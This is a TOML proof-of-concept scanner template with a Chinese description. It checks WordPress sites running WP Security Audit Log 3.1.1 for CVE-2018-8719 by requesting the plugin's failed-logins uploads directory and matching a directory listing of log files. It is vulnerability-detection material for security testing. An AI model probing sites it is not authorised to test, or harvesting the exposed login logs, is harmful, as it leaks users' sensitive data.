[info]
author = "AVE"
description = "检测 WordPress WP Security Audit Log 插件 3.1.1 版本中 wp-content/uploads/wp-security-audit-log/ 目录是否存在未授权访问漏洞，通过访问 failed-logins/ 目录验证是否返回目录列表及日志文件"
id = "POC-AVE-2018-0214"
name = "WordPress WP Security Audit Log 3.1.1 敏感信息泄露 PoC"
severity = "medium"
tags = ["ave-2018-0214"]
vuln_id = [
    "CVE-2018-8719",
    "AVE-2018-0214",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wp-content/uploads/wp-security-audit-log/failed-logins/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "[TXT]",
    ".log",
    "Index of",
]
